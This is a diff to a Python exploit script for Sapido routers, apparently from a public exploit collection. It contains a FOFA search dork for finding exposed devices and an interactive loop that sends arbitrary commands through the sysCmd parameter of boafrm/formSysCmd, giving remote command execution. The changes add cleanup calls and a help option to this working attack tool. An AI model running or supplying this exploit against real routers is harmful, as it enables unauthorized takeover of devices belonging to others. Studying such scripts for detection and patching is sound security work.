@@ -1,4 +1,5 @@
 #!/usr/bin/python3
+# -*- coding: utf-8 -*-
 #fofa dork: app="Sapido-路由器"
 '''
 Affect versions:
@@ -28,9 +29,11 @@ def Checking():
 			return True
 		else:
 			print("[-] Target is not vuln")
+			response.close()
 			return False
 	except Exception as e:
 		print("[-] Server error")
+		response.close()
 		return False
 
 def Exploit():
@@ -54,7 +57,12 @@ def Exploit():
 				pass
 		if(command == 'exit'):
 			print("[!] User exit")
+			response.close()
 			sys.exit()
+		if(command == 'help'):
+			print("cls: clean the screen")
+			print("exit: exit this program")
+			continue
 		data = "sysCmd=" + command + "&apply=Apply&submit-url=%2Fsyscmd.htm&msg=boa.conf%0D%0Amime.types%0D%0A"
 		Url = target + "boafrm/formSysCmd"
 		try:
@@ -66,8 +74,10 @@ def Exploit():
 				print(CmdShow)
 			else:
 				print("[-] Failed")
+				response.close()
 				sys.exit()
 		except Exception as e:
+			response.close()
 			print("[-] Some error happend to you")
 
 if __name__ == '__main__':
